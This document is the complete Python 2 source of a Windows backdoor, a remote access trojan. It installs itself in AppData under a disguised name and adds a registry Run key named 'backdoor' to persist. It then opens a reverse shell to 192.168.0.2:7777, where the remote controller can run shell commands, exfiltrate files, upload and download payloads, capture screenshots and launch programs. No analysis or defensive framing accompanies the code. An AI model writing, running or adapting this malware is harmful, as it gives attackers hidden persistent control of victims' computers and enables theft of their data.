#!/usr/bin/python2
#_*_ coding: utf8 _*_

import socket
import os
import subprocess
import base64
import requests
import mss
import time
import shutil
import sys

def createPersistence():
    location = os.environ['appdata'] + '\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\Current\Version\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)    

def adminCheck():
    global admin 
    try:
        check = os.listdir(os.sep.join([os.environ.get("SystemRoot",'C:\windows'),'temp']))
    except:
        admin = "Error, you don't have privileges"
    else:
        admin = "Revised administrator privileges"

def connection():
    while True:
        time.sleep(5)
        try:
            host.connect(('192.168.0.2',7777))
            shell()
        except:
            connection()

def screenShot():
    screen = mss.mss()
    screen.shot() 

def downloadFile(url):
    consulta = requests.get(url)
    name_file = url.split("/")[-1]
    with open(name_file,'wb') as file_get:
        file_get.write(consulta.content)

def shell():
    current_dir=os.getcwd()
    host.send(current_dir)
    while True:
        res = host.recv(40960)
        if res == "exit":
            break
        elif res[:2] == "cd" and len(res) > 2: 
            os.chdir(res[3:])
            result=os.getcwd()
            host.send(result)
        elif res[:8] == "download":
            with open(res[9:],'rb') as file_download:
                host.send(base64.b64encode(file_download.read()))
        elif res[:6] == "upload":
            with open(res[:7],'wb') as file_upload:
                datos = host.recv(40960)
                file_upload.write(base64.b64decode(datos)) 
        elif res[:3] == "get":
            try:
                downloadFile(res[4:])
                host.send("File downloaded succesfully")
            except:
                host.send("Download error has ocurred...")  
        elif res[:10] == "screenshot":
            try:
                screenShot()
                with open('monitor-1.png','rb') as file_send:
                    host.send(base64.b64encode(file_send.read()))
                os.remove("monitor-1.png")
            except:
                host.send(base64.b64encode("fail")) 
        elif res[:5] == "start":
            try:
                subprocess.Popen(res[6:],shell=True)
                host.send("The program started succesfully")
            except:
                host.send("The program couldn't be started")
        elif res[:5] == "check":
            try:
                adminCheck()
                host.send(admin)
            except:
                host.send("Task failed")
        else:
            proc=subprocess.Popen(res,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                host.send("1")
            else:
                host.send(result)

createPersistence()
host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
host.close()

